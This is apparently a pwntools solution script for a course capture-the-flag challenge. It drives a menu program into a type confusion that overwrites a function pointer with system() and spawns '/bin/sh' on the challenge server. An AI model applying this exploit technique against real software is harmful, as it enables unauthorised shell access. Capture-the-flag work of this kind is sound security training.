from pwn import *

binary = 'chal.bin'
e = context.binary = ELF(binary, checksec=False)

# p = process(binary)

p = remote("cse4850-type-1.chals.io", 443, ssl=True, sni="cse4850-type-1.chals.io")

# read until end of menu
p.recvuntil(b'>>> ')

# select drums
p.sendline(b'2')

# read until end of menu
p.recvuntil(b'>>> ')

# name the drums
p.sendline(b'3')

# select instrument 0
p.sendline(b'0')

# write /bin/sh
chain = b'/bin/sh\0'

chain += b'A' * 8

# make it guitar
chain += p64(0x31337)

# call system
chain += p64(e.sym['system'])

p.sendline(chain)

# read until end of menu
p.recvuntil(b'>>> ')

# select display name
p.sendline(b'4')

# select instrument 1
p.sendline(b'0')

p.interactive()
